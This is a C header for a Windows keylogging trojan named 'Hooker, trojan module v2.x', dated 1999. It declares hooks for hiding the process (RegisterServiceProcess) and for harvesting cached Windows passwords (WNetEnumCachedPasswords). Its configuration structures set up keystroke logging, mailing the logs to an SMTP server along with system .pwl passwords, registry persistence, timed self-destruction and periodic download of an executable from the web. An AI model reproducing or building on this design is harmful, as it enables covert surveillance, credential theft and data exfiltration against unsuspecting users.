/********************************************************************/
/*                                                                  */
/*                   Hooker, trojan module v2.x                     */
/*                         ACrazzi, 1999                            */
/*                                                                  */
/********************************************************************/

#ifndef HOOKER_H_ 
#define HOOKER_H_

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

#include "resource.h"

typedef DWORD (WINAPI RegisterServiceProcess)(DWORD,DWORD);
typedef RegisterServiceProcess* LPREGISTERSERVICEPROCESS;
typedef WORD (WINAPI WNetEnumCachedPasswords)(LPSTR, WORD, BYTE, void*, DWORD);
typedef WNetEnumCachedPasswords* LPWNETENUMCACHEDPASSWORDS;

typedef int (*LPGETDATA)(char*,int);
typedef bool (*LPKEYLOGOFF)(void);
typedef bool (*LPKEYLOGON)(void);
typedef void (*LPKEYLOGOPT)(int);

typedef HANDLE (WINAPI *CREATETOOL)(DWORD,DWORD);
typedef BOOL (WINAPI *FIRST32)(HANDLE,LPPROCESSENTRY32);
typedef BOOL (WINAPI *NEXT32)(HANDLE,LPPROCESSENTRY32);

#define MAX_SUBSTR 40   //max number of substrings to search
#define LOG_BUFFER_SIZE 0x4000 //size of buffer for log
#define REG_TEST_TIME 60       //time to check (sec) :
							   //     for install in registry
							   //     if killtime has passed

#ifdef _DEBUG

#define FLUSH_BUFFER_TIME 15   //time to flush log buffer to disk (sec)
#define MAIL_TEST_TIME 15      //time to check for send (sec)
#define EXEC_START_TIME 1      //time to check for another exec (sec)
#define EXEC_TEST_TIME 10      //time to check for web-file (sec)
#define CON_TEST_TIME 5        //time to check for connection

#else 

#define FLUSH_BUFFER_TIME 60   //time to flush log buffer to disk (sec)
#define MAIL_TEST_TIME 30      //time to check for send (sec)
#define EXEC_START_TIME 30     //time to check for another exec (sec)
#define EXEC_TEST_TIME 300     //time to check for web-file (sec)
#define CON_TEST_TIME 10       //time to check for connection
#endif

  
#pragma pack( 1 )   //no auto-aligning of structures

// NT 4.0:	WORD=2 UINT=4 SYSTEMTIME=7
// TOTAL:	2+14x4+2+2x7+10x2+4=98

struct _AttachedData {
	WORD signature;      //signature (0x3104)
	UINT loglimit;       //max logfile-size in bytes
	UINT sendafter;      //if log-size is more than this, then send it by mail
	UINT reg_descr_ofs;  //offset to description in registry
	UINT reg_path_ofs;   //offset to path in registry to install
	UINT exe_ofs;        //offset to exe-name
	UINT dll_ofs;        //offset to keylogdll-name
	UINT n_ss;           //number of substrings
	UINT ss_ofs;         //offset to substrings
	UINT logname_ofs;    //offset to logfile-name
	UINT host_ofs;       //offset to name of sendmail-server
	UINT mailfrom_ofs;   //offset to mailfrom address
	UINT mailto_ofs;     //offset to mailto address
	UINT subj_ofs;       //offset to subject of message
	UINT http_ofs;       //offset to address of file in web
	WORD port;           //sendmail's port (usually 25)
	SYSTEMTIME send_i;   //timespan between logfiles-sending
	SYSTEMTIME kill_i;   //timespan to self-destruct
	WORD total_log:1;    //keylog all time?
	WORD encrypt_log:1;  //encrypt keylog?
	WORD send_mail:1;    //send keylog by mail?
	WORD syspass:1;      //add system password (from *.pwl) to mail?
	WORD autokill:1;     //kill itself?
	WORD fullname:1;     //full exe-name in registry?
	WORD exepath:2;      //where? 0 - %windir%, 1 - %windir%\system, 2 - user-defined
	WORD ras:1;          //use RAS-functions for connection-detecting?
	WORD emp_log:1;      //log windows where nothing was pressed?
	WORD adv_log:1;      //log all 
	UINT number;         //identification number
};

struct _StartupInfo {
	WORD total_log:1;    //keylog all time?
	WORD encrypt_log:1;  //encrypt log?
	WORD send_mail:1;    //send log by email
	WORD syspass:1;      //add system password (from *.pwl) to mail?
	WORD autokill:1;     //kill itself?
	WORD fullname:1;     //full exe-name in registry?
	WORD exepath:2;      //where? 0 - %windir%, 1 - %windir%\system, 2 - user-defined
	WORD ras:1;          //use RAS-functions for connection-detecting?
	UINT loglimit;       //max logfile-size in bytes
	UINT sendafter;      //if log-size is more than this, then send it by mail
	UINT logsize;        //current size of logfile
	UINT nsubstr;	     //number of substrings to search
	char* substr[MAX_SUBSTR];//substrings
	char logname[0x100]; //name of logfile
	char host[0x100];    //IP or name of sendmail-server
	char mailfrom[0x100];//mailfrom address
	char subj[0x100];    //subject of message
	char mailto[0x100];  //mailto address
	WORD port;           //sendmail's port
	char exe_name[0x100];//name of exe-file
	char dll_name[0x100];//name of keyripper-dll
	char full_exe_name[0x100];//full name of exe
	char reg_desc[0x100];//description in registry
	char reg_path[0x100];//path in registry
	char http[0x100];    //exe in web
	SYSTEMTIME send_i;   //timspan between log-sending
	SYSTEMTIME send_d;   //date of the last send
	SYSTEMTIME inst_d;   //time of current lifetime of hooker
	SYSTEMTIME kill_i;   //timespan to selfdestruct
	SYSTEMTIME lastexec; //time of latest web-exe download
	UINT number;         //identification number
};

#endif